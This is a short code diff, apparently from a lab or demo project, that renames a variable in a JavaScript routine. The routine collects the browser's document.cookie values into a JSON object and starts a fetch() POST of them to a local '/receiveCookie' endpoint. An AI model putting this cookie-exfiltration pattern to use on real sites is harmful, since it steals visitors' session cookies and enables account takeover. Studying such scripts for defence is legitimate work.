@@ -7,14 +7,14 @@
 var cookie = document.cookie;
 cookie = cookie.split(";")
 
-var cookieMap = {}
+var cookieObj = {}
 cookie.forEach(element => {
   let [key, value] = element.split("=");
-  cookieMap[key.trim()] = value.trim();
+  cookieObj[key.trim()] = value.trim();
   
 });
 
-var jsonData = JSON.stringify(cookieMap);
+var jsonData = JSON.stringify(cookieObj);
 
 // Send the data using fetch()
 fetch("http://127.0.0.1:5000/receiveCookie", {
